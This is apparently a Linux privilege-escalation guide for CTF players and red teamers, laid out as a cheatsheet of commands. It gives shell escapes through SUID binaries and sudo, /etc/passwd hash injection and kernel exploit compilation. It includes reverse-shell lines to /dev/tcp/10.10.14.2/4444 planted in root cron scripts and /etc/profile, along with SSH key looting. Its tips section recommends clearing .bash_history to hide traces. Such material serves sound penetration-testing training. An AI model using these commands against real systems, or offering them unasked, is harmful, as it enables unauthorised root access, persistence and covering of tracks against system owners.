---
icon: linux
---

# LinuxPrivEsc

## **Linux PrivEsc for Hackers — From Shell to Root**

***

Privilege Escalation (PrivEsc) is where most CTFs and real-world engagements are won. Once you’ve got a foothold — it’s game over _if you know where to look_.\
This guide is your **arsenal for turning low shells into root access**, systematically and stealthily.

***

### I. 🧩 Core Concepts

| Concept                   | Description                                                                           |
| ------------------------- | ------------------------------------------------------------------------------------- |
| **Privilege Escalation**  | Exploiting system misconfigurations, services, or binaries to gain higher privileges. |
| **Vertical Escalation**   | From low-priv user → root.                                                            |
| **Horizontal Escalation** | From one user → another user.                                                         |
| **Persistence**           | Maintaining access after PrivEsc.                                                     |
| **Enumeration**           | The first and most crucial step. Knowing the system inside out.                       |

***

### II. 🔍 Enumeration: Know Your Battlefield

Before exploiting, **enumerate everything**.

#### 🧠 System Enumeration

```bash
whoami
id
hostname
uname -a
cat /etc/os-release
lsb_release -a
```

#### 📁 File System & Permissions

```bash
ls -la /
find / -type f -perm -4000 2>/dev/null      # Find SUID binaries
find / -type f -perm -2000 2>/dev/null      # Find SGID binaries
find / -type f -perm -777 2>/dev/null       # World-writable files
```

#### ⚙️ Process & Service Enumeration

```bash
ps aux | grep root
ss -tuln
netstat -tuln
lsof -i
```

#### 🧰 Useful Tools

| Tool                        | Purpose                                   |
| --------------------------- | ----------------------------------------- |
| `linpeas.sh`                | Automated PrivEsc enumeration.            |
| `pspy`                      | Process monitor without root.             |
| `linux-exploit-suggester`   | Kernel & local exploit suggestions.       |
| `enum4linux`                | Network enumeration.                      |
| `lshell`, `bash`, `sudo -l` | Command restriction and privilege checks. |

***

### III. ⚙️ Common Privilege Escalation Vectors

***

#### 1. 🧩 SUID / SGID Abuse

**🔍 Find SUID Binaries**

```bash
find / -perm -4000 2>/dev/null
```

**🔓 Exploit Examples**

```bash
/usr/bin/find . -exec /bin/sh \; -quit
/usr/bin/vim -c ':!/bin/sh'
/bin/bash -p
```

Check [GTFOBins](https://gtfobins.github.io/) for any binary that allows shell escape.

***

#### 2. ⚙️ Misconfigured `sudo`

**🔍 Check Permissions**

```bash
sudo -l
```

**🔓 Exploits**

If you can run a binary as root:

```bash
sudo /bin/bash
```

If restricted:

```bash
sudo vim -c ':!/bin/sh'
sudo awk 'BEGIN {system("/bin/sh")}'
sudo perl -e 'exec "/bin/sh";'
```

If you can run scripts with `sudo`, **edit or replace** them with malicious payloads.

***

#### 3. 🧠 Exploiting Weak File Permissions

```bash
ls -la /etc/passwd
ls -la /etc/shadow
```

If `/etc/passwd` is writable:

```bash
openssl passwd -1 "password123"
# Copy the hash into /etc/passwd
```

***

#### 4. 💥 Kernel Exploits

If enumeration shows an outdated kernel:

```bash
uname -r
```

Use:

```bash
linux-exploit-suggester.sh
```

Then compile and run a matching exploit (e.g., DirtyCow, DirtyPipe, OverlayFS).

Example:

```bash
gcc exploit.c -o exploit
./exploit
```

⚠️ Always test in CTF labs, **not** production targets.

***

#### 5. 🧩 Cron Jobs & Scheduled Tasks

**🔍 Find Scheduled Tasks**

```bash
cat /etc/crontab
ls -la /etc/cron.*
```

If a job runs with root privileges and you can modify the script:

```bash
echo "bash -i >& /dev/tcp/10.10.14.2/4444 0>&1" >> /path/to/script.sh
```

Next time the cron runs — you’re root.

***

#### 6. 🧰 PATH Hijacking

If root runs scripts referencing binaries without absolute paths:

```bash
echo "/bin/sh" > /tmp/ls
chmod +x /tmp/ls
export PATH=/tmp:$PATH
sudo /path/to/script.sh
```

Boom — your `/tmp/ls` executes as root.

***

#### 7. 🧩 Writable `/etc/profile` or `/etc/bashrc`

```bash
echo "bash -i >& /dev/tcp/10.10.14.2/4444 0>&1" >> /etc/profile
```

New sessions will spawn a reverse shell.

***

#### 8. 🧬 Exploiting Services Running as Root

Look for:

* Web apps writing to `/tmp`
* Systemd service misconfigurations
* Custom scripts in `/usr/local/bin`

Example:

```bash
cat /etc/systemd/system/vuln.service
```

If it runs a writable script → inject payload.

***

#### 9. 🧩 SSH Key Abuse

Check for SSH keys:

```bash
find / -name id_rsa 2>/dev/null
cat ~/.ssh/id_rsa
```

If readable by low-priv user, copy it and connect as another user:

```bash
ssh -i id_rsa user@target
```

***

### IV. 🧠 Real-World PrivEsc Workflow

```bash
# Step 1: System Recon
whoami && hostname && uname -a

# Step 2: Enumeration
linpeas.sh > enum.txt

# Step 3: Identify Weak Points
grep -E "SUID|CRON|sudo" enum.txt

# Step 4: Exploit
sudo -l
find / -perm -4000 -type f 2>/dev/null
```

After root:

```bash
id && whoami && cat /root/root.txt
```

***

### V. 🧰 Quick Cheatsheet

| Vector              | Key Command                      | Example Exploit                          |
| ------------------- | -------------------------------- | ---------------------------------------- |
| **SUID Binary**     | `find / -perm -4000 2>/dev/null` | `/usr/bin/find . -exec /bin/sh \; -quit` |
| **Sudo Misconfig**  | `sudo -l`                        | `sudo vim -c ':!/bin/sh'`                |
| **Cron Job Abuse**  | `cat /etc/crontab`               | Append reverse shell to job file         |
| **Kernel Exploit**  | `uname -r`                       | DirtyPipe / DirtyCow                     |
| **PATH Hijack**     | `echo $PATH`                     | Replace binary with malicious one        |
| **Writable Script** | `ls -la /etc/*.sh`               | Inject commands                          |
| **SSH Key Looting** | `find / -name id_rsa`            | Copy key, SSH as user                    |

***

### VI. 🧠 PrivEsc Automation Tools

| Tool         | Description                       |
| ------------ | --------------------------------- |
| **LinPEAS**  | Comprehensive Linux enumeration.  |
| **pspy**     | Real-time process monitoring.     |
| **LES.sh**   | Kernel exploit suggester.         |
| **LSE**      | Lightweight system enumerator.    |
| **GTFOBins** | Database of exploitable binaries. |

```bash
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

***

### VII. 💀 Pro Tips & Red Team Tactics

* Always exfiltrate enumeration output (`enum.txt`) for offline analysis.
* Never run kernel exploits blind — confirm the version.
* Abuse environment variables (`LD_PRELOAD`, `PATH`, `SHELL`, etc.).
* Replace binaries only when execution context runs as root.
* Combine techniques — e.g. writable cron + SUID binary = instant root.
* Hide post-exploit artifacts (`touch /tmp/.stealth` or clean `.bash_history`).
* Use **pspy** to catch secrets or root cron jobs running dynamically.

***

### VIII. ⚔️ Bonus: Bash PrivEsc Template

```bash
#!/bin/bash
# Linux PrivEsc Auto-Scanner
echo "[*] Starting Enumeration..."
whoami; hostname; uname -a
echo "[*] Checking sudo..."
sudo -l
echo "[*] Searching for SUID binaries..."
find / -perm -4000 2>/dev/null
echo "[*] Checking writable files..."
find / -type f -perm -2 -user root 2>/dev/null
echo "[*] Checking cron jobs..."
cat /etc/crontab
```

***
